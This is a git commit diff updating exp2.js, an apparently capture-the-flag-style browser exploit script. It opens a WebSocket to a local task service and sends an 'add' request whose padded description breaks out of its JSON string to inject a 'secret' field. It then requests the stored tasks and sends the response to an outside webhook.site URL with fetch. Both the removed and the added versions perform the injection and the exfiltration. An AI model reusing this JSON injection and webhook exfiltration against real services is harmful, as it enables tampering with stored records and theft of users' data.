90d663db4f15b23fe3deb9a2e3a2121182c39651
hojgitech <156871780+hojgitech@users.noreply.github.com>
2024-01-29 16:30:32 +0800

    Update exp2.js
    Update exp2.js

--- exp2.js
+++ exp2.js
@@ -1,15 +1,20 @@
-const target = '127.0.0.1';
-const ws = new WebSocket(`ws://${target}/ws`);
-
+const ws = new WebSocket(`ws://127.0.0.1/ws`);
 ws.onopen = () => {
-    ws.send(JSON.stringify({
-        action: 'add',
-        title: 'A',
-        description: 'A'.repeat(244) + '","secret":"00000000000000000000000000000000"'
+    ws.send(JSON.stringify(
+        {
+             action: 'add',
+              title: "1",
+              description: "111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111\",\"secret\": \"73c12045f8de028073fdbe7931f2ff86\"}" 
     }));
-    ws.send(JSON.stringify({ action: 'get' }));
-};
-
-ws.onmessage = msg => {
-    fetch(`https://webhook.site/2c4731b9-aac2-4eeb-8664-c60f0adc0b92?m=${encodeURIComponent(msg.data)}`);
-};
+    ws.send(JSON.stringify({ action: 'get' }))
+}
+ws.onmessage = async (msg) => {
+    const data = JSON.parse(msg.data);
+    if (data.success) {
+        if (data.action === 'get') {
+            fetch("https://webhook.site/2c4731b9-aac2-4eeb-8664-c60f0adc0b92/" + JSON.stringify(data.tasks ))
+        }
+        else if (data.action === 'add') {
+        }
+    }
+}
